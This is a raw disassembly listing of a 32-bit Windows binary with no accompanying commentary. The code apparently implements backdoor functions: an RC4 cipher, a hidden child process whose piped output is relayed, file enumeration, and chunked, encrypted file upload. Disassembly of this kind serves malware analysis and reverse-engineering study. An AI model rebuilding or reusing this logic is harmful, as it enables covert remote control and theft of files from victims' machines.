  401d9f:	52                   	push   %edx
  401da0:	a3 38 16 41 00       	mov    %eax,0x411638
  401da5:	a1 cc 16 41 00       	mov    0x4116cc,%eax
  401daa:	b9 a0 16 41 00       	mov    $0x4116a0,%ecx
  401daf:	c7 05 00 16 41 00 44 	movl   $0x44,0x411600
  401db6:	00 00 00 
  401db9:	c7 05 2c 16 41 00 01 	movl   $0x101,0x41162c
  401dc0:	01 00 00 
  401dc3:	66 89 35 30 16 41 00 	mov    %si,0x411630
  401dca:	a3 3c 16 41 00       	mov    %eax,0x41163c
  401dcf:	a3 40 16 41 00       	mov    %eax,0x411640
  401dd4:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  401dda:	50                   	push   %eax
  401ddb:	56                   	push   %esi
  401ddc:	56                   	push   %esi
  401ddd:	6a 01                	push   $0x1
  401ddf:	bf b8 16 41 00       	mov    $0x4116b8,%edi
  401de4:	56                   	push   %esi
  401de5:	56                   	push   %esi
  401de6:	8b cf                	mov    %edi,%ecx
  401de8:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  401dee:	50                   	push   %eax
  401def:	56                   	push   %esi
  401df0:	ff 15 74 d1 40 00    	call   *0x40d174
  401df6:	85 c0                	test   %eax,%eax
  401df8:	0f 95 c0             	setne  %al
  401dfb:	68 a0 d4 40 00       	push   $0x40d4a0
  401e00:	8b cf                	mov    %edi,%ecx
  401e02:	a2 e0 16 41 00       	mov    %al,0x4116e0
  401e07:	ff 15 78 d2 40 00    	call   *0x40d278
  401e0d:	8b cb                	mov    %ebx,%ecx
  401e0f:	c6 05 e1 16 41 00 01 	movb   $0x1,0x4116e1
  401e16:	e8 85 f2 ff ff       	call   0x4010a0
  401e1b:	83 ec 10             	sub    $0x10,%esp
  401e1e:	be 78 11 41 00       	mov    $0x411178,%esi
  401e23:	8b fc                	mov    %esp,%edi
  401e25:	8b cb                	mov    %ebx,%ecx
  401e27:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401e28:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401e29:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401e2a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401e2b:	e8 d3 f2 ff ff       	call   0x401103
  401e30:	83 ec 10             	sub    $0x10,%esp
  401e33:	8d 45 08             	lea    0x8(%ebp),%eax
  401e36:	8b cc                	mov    %esp,%ecx
  401e38:	50                   	push   %eax
  401e39:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  401e3f:	68 93 00 00 00       	push   $0x93
  401e44:	8b cb                	mov    %ebx,%ecx
  401e46:	e8 df f2 ff ff       	call   0x40112a
  401e4b:	68 2c 01 00 00       	push   $0x12c
  401e50:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401e53:	ff 15 94 d1 40 00    	call   *0x40d194
  401e59:	33 f6                	xor    %esi,%esi
  401e5b:	80 3d e0 16 41 00 00 	cmpb   $0x0,0x4116e0
  401e62:	0f 84 b9 01 00 00    	je     0x402021
  401e68:	8d 45 ec             	lea    -0x14(%ebp),%eax
  401e6b:	56                   	push   %esi
  401e6c:	50                   	push   %eax
  401e6d:	56                   	push   %esi
  401e6e:	56                   	push   %esi
  401e6f:	56                   	push   %esi
  401e70:	ff 35 b0 16 41 00    	push   0x4116b0
  401e76:	89 75 ec             	mov    %esi,-0x14(%ebp)
  401e79:	ff 15 78 d1 40 00    	call   *0x40d178
  401e7f:	39 75 ec             	cmp    %esi,-0x14(%ebp)
  401e82:	0f 86 d1 00 00 00    	jbe    0x401f59
  401e88:	ff 75 ec             	push   -0x14(%ebp)
  401e8b:	ff 15 7c d3 40 00    	call   *0x40d37c
  401e91:	59                   	pop    %ecx
  401e92:	8b f8                	mov    %eax,%edi
  401e94:	8d 45 e8             	lea    -0x18(%ebp),%eax
  401e97:	56                   	push   %esi
  401e98:	50                   	push   %eax
  401e99:	ff 75 ec             	push   -0x14(%ebp)
  401e9c:	57                   	push   %edi
  401e9d:	ff 35 b0 16 41 00    	push   0x4116b0
  401ea3:	ff 15 7c d1 40 00    	call   *0x40d17c
  401ea9:	39 75 e8             	cmp    %esi,-0x18(%ebp)
  401eac:	0f 86 9d 00 00 00    	jbe    0x401f4f
  401eb2:	39 75 f4             	cmp    %esi,-0xc(%ebp)
  401eb5:	76 5e                	jbe    0x401f15
  401eb7:	ff 75 f4             	push   -0xc(%ebp)
  401eba:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  401ebd:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  401ec3:	50                   	push   %eax
  401ec4:	57                   	push   %edi
  401ec5:	ff 15 78 d3 40 00    	call   *0x40d378
  401ecb:	83 c4 0c             	add    $0xc,%esp
  401ece:	85 c0                	test   %eax,%eax
  401ed0:	75 43                	jne    0x401f15
  401ed2:	8d 45 ff             	lea    -0x1(%ebp),%eax
  401ed5:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  401ed8:	50                   	push   %eax
  401ed9:	57                   	push   %edi
  401eda:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  401ee0:	83 ec 10             	sub    $0x10,%esp
  401ee3:	8d 45 fe             	lea    -0x2(%ebp),%eax
  401ee6:	8b cc                	mov    %esp,%ecx
  401ee8:	50                   	push   %eax
  401ee9:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401eec:	2b 45 f4             	sub    -0xc(%ebp),%eax
  401eef:	50                   	push   %eax
  401ef0:	8d 45 c8             	lea    -0x38(%ebp),%eax
  401ef3:	ff 75 f4             	push   -0xc(%ebp)
  401ef6:	50                   	push   %eax
  401ef7:	ff 15 80 d2 40 00    	call   *0x40d280
  401efd:	6a 62                	push   $0x62
  401eff:	8b cb                	mov    %ebx,%ecx
  401f01:	e8 24 f2 ff ff       	call   0x40112a
  401f06:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401f09:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  401f0c:	eb 3b                	jmp    0x401f49
  401f0e:	32 db                	xor    %bl,%bl
  401f10:	e9 32 01 00 00       	jmp    0x402047
  401f15:	8d 45 fd             	lea    -0x3(%ebp),%eax
  401f18:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  401f1b:	50                   	push   %eax
  401f1c:	57                   	push   %edi
  401f1d:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  401f23:	83 ec 10             	sub    $0x10,%esp
  401f26:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401f29:	8b cc                	mov    %esp,%ecx
  401f2b:	50                   	push   %eax
  401f2c:	8d 45 b8             	lea    -0x48(%ebp),%eax
  401f2f:	ff 75 e8             	push   -0x18(%ebp)
  401f32:	56                   	push   %esi
  401f33:	50                   	push   %eax
  401f34:	ff 15 80 d2 40 00    	call   *0x40d280
  401f3a:	6a 62                	push   $0x62
  401f3c:	8b cb                	mov    %ebx,%ecx
  401f3e:	e8 e7 f1 ff ff       	call   0x40112a
  401f43:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401f46:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  401f49:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  401f4f:	57                   	push   %edi
  401f50:	ff 15 80 d3 40 00    	call   *0x40d380
  401f56:	59                   	pop    %ecx
  401f57:	eb 20                	jmp    0x401f79
  401f59:	83 ec 10             	sub    $0x10,%esp
  401f5c:	8d 45 fb             	lea    -0x5(%ebp),%eax
  401f5f:	8b cc                	mov    %esp,%ecx
  401f61:	50                   	push   %eax
  401f62:	68 a0 d4 40 00       	push   $0x40d4a0
  401f67:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  401f6d:	6a 62                	push   $0x62
  401f6f:	8b cb                	mov    %ebx,%ecx
  401f71:	e8 b4 f1 ff ff       	call   0x40112a
  401f76:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401f79:	83 7d f0 ff          	cmpl   $0xffffffff,-0x10(%ebp)
  401f7d:	75 07                	jne    0x401f86
  401f7f:	80 25 e1 16 41 00 00 	andb   $0x0,0x4116e1
  401f86:	bf b8 16 41 00       	mov    $0x4116b8,%edi
  401f8b:	8b cf                	mov    %edi,%ecx
  401f8d:	ff 15 c4 d2 40 00    	call   *0x40d2c4
  401f93:	85 c0                	test   %eax,%eax
  401f95:	76 4d                	jbe    0x401fe4
  401f97:	68 c8 d5 40 00       	push   $0x40d5c8
  401f9c:	8b cf                	mov    %edi,%ecx
  401f9e:	ff 15 7c d2 40 00    	call   *0x40d27c
  401fa4:	68 b8 16 41 00       	push   $0x4116b8
  401fa9:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  401fac:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  401fb2:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401fb5:	56                   	push   %esi
  401fb6:	50                   	push   %eax
  401fb7:	8b cf                	mov    %edi,%ecx
  401fb9:	ff 15 c4 d2 40 00    	call   *0x40d2c4
  401fbf:	50                   	push   %eax
  401fc0:	8b cf                	mov    %edi,%ecx
  401fc2:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  401fc8:	50                   	push   %eax
  401fc9:	ff 35 c8 16 41 00    	push   0x4116c8
  401fcf:	ff 15 80 d1 40 00    	call   *0x40d180
  401fd5:	68 a0 d4 40 00       	push   $0x40d4a0
  401fda:	8b cf                	mov    %edi,%ecx
  401fdc:	ff 15 78 d2 40 00    	call   *0x40d278
  401fe2:	eb 03                	jmp    0x401fe7
  401fe4:	89 75 f4             	mov    %esi,-0xc(%ebp)
  401fe7:	6a 64                	push   $0x64
  401fe9:	ff 15 94 d1 40 00    	call   *0x40d194
  401fef:	80 3d e1 16 41 00 00 	cmpb   $0x0,0x4116e1
  401ff6:	0f 85 6c fe ff ff    	jne    0x401e68
  401ffc:	56                   	push   %esi
  401ffd:	ff 35 d0 16 41 00    	push   0x4116d0
  402003:	ff 15 84 d1 40 00    	call   *0x40d184
  402009:	ff 35 d4 16 41 00    	push   0x4116d4
  40200f:	8b 35 a4 d1 40 00    	mov    0x40d1a4,%esi
  402015:	ff d6                	call   *%esi
  402017:	ff 35 d0 16 41 00    	push   0x4116d0
  40201d:	ff d6                	call   *%esi
  40201f:	eb 06                	jmp    0x402027
  402021:	8b 35 a4 d1 40 00    	mov    0x40d1a4,%esi
  402027:	8b cb                	mov    %ebx,%ecx
  402029:	e8 2e f1 ff ff       	call   0x40115c
  40202e:	ff 35 b0 16 41 00    	push   0x4116b0
  402034:	ff d6                	call   *%esi
  402036:	ff 35 cc 16 41 00    	push   0x4116cc
  40203c:	ff d6                	call   *%esi
  40203e:	80 25 e0 16 41 00 00 	andb   $0x0,0x4116e0
  402045:	b3 01                	mov    $0x1,%bl
  402047:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40204a:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402050:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402053:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402059:	5f                   	pop    %edi
  40205a:	8a c3                	mov    %bl,%al
  40205c:	5e                   	pop    %esi
  40205d:	5b                   	pop    %ebx
  40205e:	c9                   	leave
  40205f:	c3                   	ret
  402060:	b9 a0 16 41 00       	mov    $0x4116a0,%ecx
  402065:	ff 25 d8 d2 40 00    	jmp    *0x40d2d8
  40206b:	b9 58 16 41 00       	mov    $0x411658,%ecx
  402070:	e9 f6 f0 ff ff       	jmp    0x40116b
  402075:	80 25 e1 16 41 00 00 	andb   $0x0,0x4116e1
  40207c:	c3                   	ret
  40207d:	55                   	push   %ebp
  40207e:	8b ec                	mov    %esp,%ebp
  402080:	56                   	push   %esi
  402081:	8b f1                	mov    %ecx,%esi
  402083:	ff 75 0c             	push   0xc(%ebp)
  402086:	ff 75 08             	push   0x8(%ebp)
  402089:	e8 0a 00 00 00       	call   0x402098
  40208e:	8b c6                	mov    %esi,%eax
  402090:	5e                   	pop    %esi
  402091:	5d                   	pop    %ebp
  402092:	c2 08 00             	ret    $0x8
  402095:	8b c1                	mov    %ecx,%eax
  402097:	c3                   	ret
  402098:	55                   	push   %ebp
  402099:	8b ec                	mov    %esp,%ebp
  40209b:	51                   	push   %ecx
  40209c:	53                   	push   %ebx
  40209d:	56                   	push   %esi
  40209e:	57                   	push   %edi
  40209f:	33 db                	xor    %ebx,%ebx
  4020a1:	33 c0                	xor    %eax,%eax
  4020a3:	8b d1                	mov    %ecx,%edx
  4020a5:	bf 00 01 00 00       	mov    $0x100,%edi
  4020aa:	89 02                	mov    %eax,(%edx)
  4020ac:	40                   	inc    %eax
  4020ad:	83 c2 04             	add    $0x4,%edx
  4020b0:	3b c7                	cmp    %edi,%eax
  4020b2:	7c f6                	jl     0x4020aa
  4020b4:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4020b7:	8b f1                	mov    %ecx,%esi
  4020b9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4020bc:	33 d2                	xor    %edx,%edx
  4020be:	f7 75 0c             	divl   0xc(%ebp)
  4020c1:	8b 45 08             	mov    0x8(%ebp),%eax
  4020c4:	0f b6 04 02          	movzbl (%edx,%eax,1),%eax
  4020c8:	03 06                	add    (%esi),%eax
  4020ca:	03 c3                	add    %ebx,%eax
  4020cc:	8b df                	mov    %edi,%ebx
  4020ce:	99                   	cltd
  4020cf:	f7 fb                	idiv   %ebx
  4020d1:	8a 06                	mov    (%esi),%al
  4020d3:	ff 45 fc             	incl   -0x4(%ebp)
  4020d6:	0f b6 c0             	movzbl %al,%eax
  4020d9:	8b da                	mov    %edx,%ebx
  4020db:	8b 14 99             	mov    (%ecx,%ebx,4),%edx
  4020de:	89 16                	mov    %edx,(%esi)
  4020e0:	83 c6 04             	add    $0x4,%esi
  4020e3:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  4020e6:	89 04 99             	mov    %eax,(%ecx,%ebx,4)
  4020e9:	7c ce                	jl     0x4020b9
  4020eb:	5f                   	pop    %edi
  4020ec:	5e                   	pop    %esi
  4020ed:	5b                   	pop    %ebx
  4020ee:	c9                   	leave
  4020ef:	c2 08 00             	ret    $0x8
  4020f2:	55                   	push   %ebp
  4020f3:	8b ec                	mov    %esp,%ebp
  4020f5:	81 ec 08 04 00 00    	sub    $0x408,%esp
  4020fb:	53                   	push   %ebx
  4020fc:	56                   	push   %esi
  4020fd:	8b f1                	mov    %ecx,%esi
  4020ff:	bb 00 01 00 00       	mov    $0x100,%ebx
  402104:	57                   	push   %edi
  402105:	8b cb                	mov    %ebx,%ecx
  402107:	8d bd f8 fb ff ff    	lea    -0x408(%ebp),%edi
  40210d:	33 c0                	xor    %eax,%eax
  40210f:	ff 45 0c             	incl   0xc(%ebp)
  402112:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402115:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402117:	8b f8                	mov    %eax,%edi
  402119:	74 5e                	je     0x402179
  40211b:	eb 03                	jmp    0x402120
  40211d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402120:	40                   	inc    %eax
  402121:	8b cb                	mov    %ebx,%ecx
  402123:	99                   	cltd
  402124:	f7 f9                	idiv   %ecx
  402126:	8b 84 95 f8 fb ff ff 	mov    -0x408(%ebp,%edx,4),%eax
  40212d:	8b f3                	mov    %ebx,%esi
  40212f:	03 45 fc             	add    -0x4(%ebp),%eax
  402132:	89 55 f8             	mov    %edx,-0x8(%ebp)
  402135:	8d 8c 95 f8 fb ff ff 	lea    -0x408(%ebp,%edx,4),%ecx
  40213c:	99                   	cltd
  40213d:	f7 fe                	idiv   %esi
  40213f:	8a 01                	mov    (%ecx),%al
  402141:	8b f2                	mov    %edx,%esi
  402143:	8b 94 b5 f8 fb ff ff 	mov    -0x408(%ebp,%esi,4),%edx
  40214a:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40214d:	89 11                	mov    %edx,(%ecx)
  40214f:	8d b4 b5 f8 fb ff ff 	lea    -0x408(%ebp,%esi,4),%esi
  402156:	0f b6 d0             	movzbl %al,%edx
  402159:	8b 45 08             	mov    0x8(%ebp),%eax
  40215c:	89 16                	mov    %edx,(%esi)
  40215e:	8d 34 07             	lea    (%edi,%eax,1),%esi
  402161:	8b 01                	mov    (%ecx),%eax
  402163:	03 c2                	add    %edx,%eax
  402165:	8b cb                	mov    %ebx,%ecx
  402167:	99                   	cltd
  402168:	f7 f9                	idiv   %ecx
  40216a:	8a 84 95 f8 fb ff ff 	mov    -0x408(%ebp,%edx,4),%al
  402171:	30 06                	xor    %al,(%esi)
  402173:	47                   	inc    %edi
  402174:	3b 7d 0c             	cmp    0xc(%ebp),%edi
  402177:	72 a4                	jb     0x40211d
  402179:	5f                   	pop    %edi
  40217a:	5e                   	pop    %esi
  40217b:	5b                   	pop    %ebx
  40217c:	c9                   	leave
  40217d:	c2 08 00             	ret    $0x8
  402180:	55                   	push   %ebp
  402181:	8b ec                	mov    %esp,%ebp
  402183:	83 ec 10             	sub    $0x10,%esp
  402186:	8d 45 0f             	lea    0xf(%ebp),%eax
  402189:	56                   	push   %esi
  40218a:	50                   	push   %eax
  40218b:	8b f1                	mov    %ecx,%esi
  40218d:	ff 75 10             	push   0x10(%ebp)
  402190:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402193:	ff 75 0c             	push   0xc(%ebp)
  402196:	ff 15 d0 d2 40 00    	call   *0x40d2d0
  40219c:	ff 75 10             	push   0x10(%ebp)
  40219f:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4021a2:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4021a8:	50                   	push   %eax
  4021a9:	8b ce                	mov    %esi,%ecx
  4021ab:	e8 42 ff ff ff       	call   0x4020f2
  4021b0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4021b3:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4021b6:	50                   	push   %eax
  4021b7:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  4021bd:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4021c0:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4021c6:	8b 45 08             	mov    0x8(%ebp),%eax
  4021c9:	5e                   	pop    %esi
  4021ca:	c9                   	leave
  4021cb:	c2 0c 00             	ret    $0xc
  4021ce:	e8 05 00 00 00       	call   0x4021d8
  4021d3:	e9 0d 00 00 00       	jmp    0x4021e5
  4021d8:	6a 00                	push   $0x0
  4021da:	b9 e8 16 41 00       	mov    $0x4116e8,%ecx
  4021df:	e8 94 ee ff ff       	call   0x401078
  4021e4:	c3                   	ret
  4021e5:	68 f1 21 40 00       	push   $0x4021f1
  4021ea:	e8 c9 a1 00 00       	call   0x40c3b8
  4021ef:	59                   	pop    %ecx
  4021f0:	c3                   	ret
  4021f1:	b9 e8 16 41 00       	mov    $0x4116e8,%ecx
  4021f6:	e9 70 ef ff ff       	jmp    0x40116b
  4021fb:	55                   	push   %ebp
  4021fc:	8b ec                	mov    %esp,%ebp
  4021fe:	81 ec 88 02 00 00    	sub    $0x288,%esp
  402204:	53                   	push   %ebx
  402205:	56                   	push   %esi
  402206:	8d 85 78 fd ff ff    	lea    -0x288(%ebp),%eax
  40220c:	57                   	push   %edi
  40220d:	50                   	push   %eax
  40220e:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402211:	ff 15 98 d2 40 00    	call   *0x40d298
  402217:	50                   	push   %eax
  402218:	ff 15 68 d1 40 00    	call   *0x40d168
  40221e:	83 f8 ff             	cmp    $0xffffffff,%eax
  402221:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402224:	75 22                	jne    0x402248
  402226:	83 ec 10             	sub    $0x10,%esp
  402229:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40222c:	8b c4                	mov    %esp,%eax
  40222e:	51                   	push   %ecx
  40222f:	50                   	push   %eax
  402230:	e8 99 90 00 00       	call   0x40b2ce
  402235:	59                   	pop    %ecx
  402236:	59                   	pop    %ecx
  402237:	6a 54                	push   $0x54
  402239:	b9 e8 16 41 00       	mov    $0x4116e8,%ecx
  40223e:	e8 e7 ee ff ff       	call   0x40112a
  402243:	e9 f3 00 00 00       	jmp    0x40233b
  402248:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40224b:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40224e:	50                   	push   %eax
  40224f:	ff 15 dc d2 40 00    	call   *0x40d2dc
  402255:	8d 45 ff             	lea    -0x1(%ebp),%eax
  402258:	68 e4 d5 40 00       	push   $0x40d5e4
  40225d:	50                   	push   %eax
  40225e:	8d 85 a4 fd ff ff    	lea    -0x25c(%ebp),%eax
  402264:	50                   	push   %eax
  402265:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  402268:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  40226e:	50                   	push   %eax
  40226f:	ff 15 6c d2 40 00    	call   *0x40d26c
  402275:	59                   	pop    %ecx
  402276:	8a d8                	mov    %al,%bl
  402278:	59                   	pop    %ecx
  402279:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40227c:	ff 15 9c d2 40 00    	call   *0x40d29c
  402282:	84 db                	test   %bl,%bl
  402284:	bf 50 02 00 00       	mov    $0x250,%edi
  402289:	74 28                	je     0x4022b3
  40228b:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40228e:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  402291:	50                   	push   %eax
  402292:	8d 85 78 fd ff ff    	lea    -0x288(%ebp),%eax
  402298:	57                   	push   %edi
  402299:	50                   	push   %eax
  40229a:	ff 15 d0 d2 40 00    	call   *0x40d2d0
  4022a0:	50                   	push   %eax
  4022a1:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4022a4:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  4022aa:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4022ad:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4022b3:	8b 35 6c d1 40 00    	mov    0x40d16c,%esi
  4022b9:	8d 85 78 fd ff ff    	lea    -0x288(%ebp),%eax
  4022bf:	50                   	push   %eax
  4022c0:	ff 75 f8             	push   -0x8(%ebp)
  4022c3:	ff d6                	call   *%esi
  4022c5:	85 c0                	test   %eax,%eax
  4022c7:	74 4e                	je     0x402317
  4022c9:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4022cc:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  4022cf:	50                   	push   %eax
  4022d0:	8d 85 78 fd ff ff    	lea    -0x288(%ebp),%eax
  4022d6:	57                   	push   %edi
  4022d7:	50                   	push   %eax
  4022d8:	ff 15 d0 d2 40 00    	call   *0x40d2d0
  4022de:	50                   	push   %eax
  4022df:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4022e2:	50                   	push   %eax
  4022e3:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4022e6:	50                   	push   %eax
  4022e7:	e8 cc a3 00 00       	call   0x40c6b8
  4022ec:	83 c4 0c             	add    $0xc,%esp
  4022ef:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4022f2:	50                   	push   %eax
  4022f3:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  4022f9:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4022fc:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402302:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  402305:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40230b:	8d 85 78 fd ff ff    	lea    -0x288(%ebp),%eax
  402311:	50                   	push   %eax
  402312:	ff 75 f8             	push   -0x8(%ebp)
  402315:	eb ac                	jmp    0x4022c3
  402317:	83 ec 10             	sub    $0x10,%esp
  40231a:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40231d:	8b cc                	mov    %esp,%ecx
  40231f:	50                   	push   %eax
  402320:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  402326:	6a 50                	push   $0x50
  402328:	b9 e8 16 41 00       	mov    $0x4116e8,%ecx
  40232d:	e8 f8 ed ff ff       	call   0x40112a
  402332:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  402335:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40233b:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40233e:	ff 15 9c d2 40 00    	call   *0x40d29c
  402344:	5f                   	pop    %edi
  402345:	5e                   	pop    %esi
  402346:	5b                   	pop    %ebx
  402347:	c9                   	leave
  402348:	c3                   	ret
  402349:	55                   	push   %ebp
  40234a:	8b ec                	mov    %esp,%ebp
  40234c:	b8 40 02 01 00       	mov    $0x10240,%eax
  402351:	e8 aa a0 00 00       	call   0x40c400
  402356:	53                   	push   %ebx
  402357:	56                   	push   %esi
  402358:	57                   	push   %edi
  402359:	8d 8d a8 fb ff ff    	lea    -0x458(%ebp),%ecx
  40235f:	e8 31 fd ff ff       	call   0x402095
  402364:	68 a0 d4 40 00       	push   $0x40d4a0
  402369:	68 58 11 41 00       	push   $0x411158
  40236e:	ff 15 b4 d2 40 00    	call   *0x40d2b4
  402374:	59                   	pop    %ecx
  402375:	84 c0                	test   %al,%al
  402377:	59                   	pop    %ecx
  402378:	74 22                	je     0x40239c
  40237a:	be 58 11 41 00       	mov    $0x411158,%esi
  40237f:	8b ce                	mov    %esi,%ecx
  402381:	ff 15 c4 d2 40 00    	call   *0x40d2c4
  402387:	50                   	push   %eax
  402388:	8b ce                	mov    %esi,%ecx
  40238a:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  402390:	50                   	push   %eax
  402391:	8d 8d a8 fb ff ff    	lea    -0x458(%ebp),%ecx
  402397:	e8 fc fc ff ff       	call   0x402098
  40239c:	8b 7d 08             	mov    0x8(%ebp),%edi
  40239f:	33 db                	xor    %ebx,%ebx
  4023a1:	be e8 fd 00 00       	mov    $0xfde8,%esi
  4023a6:	8d 45 f9             	lea    -0x7(%ebp),%eax
  4023a9:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4023ac:	50                   	push   %eax
  4023ad:	ff 15 dc d2 40 00    	call   *0x40d2dc
  4023b3:	8d 45 fa             	lea    -0x6(%ebp),%eax
  4023b6:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4023b9:	50                   	push   %eax
  4023ba:	ff 15 dc d2 40 00    	call   *0x40d2dc
  4023c0:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4023c3:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4023c6:	ff 15 b8 d2 40 00    	call   *0x40d2b8
  4023cc:	3b c6                	cmp    %esi,%eax
  4023ce:	73 41                	jae    0x402411
  4023d0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4023d3:	99                   	cltd
  4023d4:	3b 55 14             	cmp    0x14(%ebp),%edx
  4023d7:	77 38                	ja     0x402411
  4023d9:	72 05                	jb     0x4023e0
  4023db:	3b 45 10             	cmp    0x10(%ebp),%eax
  4023de:	73 31                	jae    0x402411
  4023e0:	53                   	push   %ebx
  4023e1:	8d 85 c0 fd fe ff    	lea    -0x10240(%ebp),%eax
  4023e7:	56                   	push   %esi
  4023e8:	50                   	push   %eax
  4023e9:	ff 75 08             	push   0x8(%ebp)
  4023ec:	e8 0f a3 00 00       	call   0x40c700
  4023f1:	8b f8                	mov    %eax,%edi
  4023f3:	3b fb                	cmp    %ebx,%edi
  4023f5:	0f 8e 62 01 00 00    	jle    0x40255d
  4023fb:	01 7d fc             	add    %edi,-0x4(%ebp)
  4023fe:	8d 85 c0 fd fe ff    	lea    -0x10240(%ebp),%eax
  402404:	57                   	push   %edi
  402405:	50                   	push   %eax
  402406:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  402409:	ff 15 68 d2 40 00    	call   *0x40d268
  40240f:	eb b2                	jmp    0x4023c3
  402411:	b9 58 11 41 00       	mov    $0x411158,%ecx
  402416:	ff 15 b0 d2 40 00    	call   *0x40d2b0
  40241c:	84 c0                	test   %al,%al
  40241e:	0f 84 80 00 00 00    	je     0x4024a4
  402424:	8d 45 e8             	lea    -0x18(%ebp),%eax
  402427:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40242a:	50                   	push   %eax
  40242b:	ff 15 e4 d2 40 00    	call   *0x40d2e4
  402431:	68 a0 d4 40 00       	push   $0x40d4a0
  402436:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  402439:	ff 15 78 d2 40 00    	call   *0x40d278
  40243f:	ff 75 08             	push   0x8(%ebp)
  402442:	8d 45 fb             	lea    -0x5(%ebp),%eax
  402445:	83 ec 10             	sub    $0x10,%esp
  402448:	8b cc                	mov    %esp,%ecx
  40244a:	50                   	push   %eax
  40244b:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40244e:	6a 04                	push   $0x4
  402450:	50                   	push   %eax
  402451:	ff 15 d0 d2 40 00    	call   *0x40d2d0
  402457:	6a 57                	push   $0x57
  402459:	e8 43 f0 ff ff       	call   0x4014a1
  40245e:	83 c4 18             	add    $0x18,%esp
  402461:	3b fb                	cmp    %ebx,%edi
  402463:	7e 20                	jle    0x402485
  402465:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402468:	99                   	cltd
  402469:	3b 55 14             	cmp    0x14(%ebp),%edx
  40246c:	0f 82 51 ff ff ff    	jb     0x4023c3
  402472:	77 09                	ja     0x40247d
  402474:	3b 45 10             	cmp    0x10(%ebp),%eax
  402477:	0f 82 46 ff ff ff    	jb     0x4023c3
  40247d:	3b fb                	cmp    %ebx,%edi
  40247f:	0f 8f c9 00 00 00    	jg     0x40254e
  402485:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  402488:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40248e:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  402491:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  402497:	3b fb                	cmp    %ebx,%edi
  402499:	0f 8e d4 00 00 00    	jle    0x402573
